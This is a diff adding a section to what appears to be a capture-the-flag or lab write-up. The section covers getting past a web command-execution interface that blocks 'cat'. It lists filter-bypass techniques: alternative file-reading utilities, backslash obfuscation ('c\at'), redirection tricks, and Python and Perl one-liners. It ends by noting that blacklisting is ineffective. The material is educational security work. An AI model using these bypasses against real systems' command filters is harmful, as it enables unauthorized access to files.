@@ -128,4 +128,67 @@ sudo nikto -h 10.49.150.68
 
 ![Output](screenshots/7.png)
 
+- I cannot use cat command because it has Disabled.
+
 ![Output](screenshots/8.png)
+
+- The application has command filtering / blacklisting
+
+## Command Filter Bypass
+
+### Observation
+
+The web-based command execution interface restricted certain commands such as `cat`, indicating the presence of application-level filtering.
+
+However, the filtering mechanism relied on simple blacklisting, which could be bypassed using alternative techniques.
+
+---
+
+### Bypass Techniques
+
+#### Using Alternative Utilities
+
+```bash
+less file.txt
+awk '{print}' file.txt
+grep . file.txt
+strings file.txt
+nl file.txt
+sort file.txt
+```
+
+---
+
+#### Command Obfuscation
+
+```bash
+c\at file.txt
+```
+
+---
+
+#### Input Redirection & Shell Tricks
+
+```bash
+tr -d '\0' < file.txt
+cut -d "" -f1 file.txt
+while read line; do echo $line; done < file.txt
+xargs -a file.txt
+```
+
+---
+
+#### Using Scripting Languages
+
+```bash
+python3 -c 'print(open("file.txt").read())'
+perl -ne 'print' file.txt
+```
+
+---
+
+### Insight
+
+The restriction was implemented using a basic blacklist approach, which only blocked specific command names. This type of filtering is ineffective, as it can be bypassed using alternative binaries, command obfuscation, or scripting techniques.
+
+This demonstrates a common security misconfiguration in command injection scenarios.
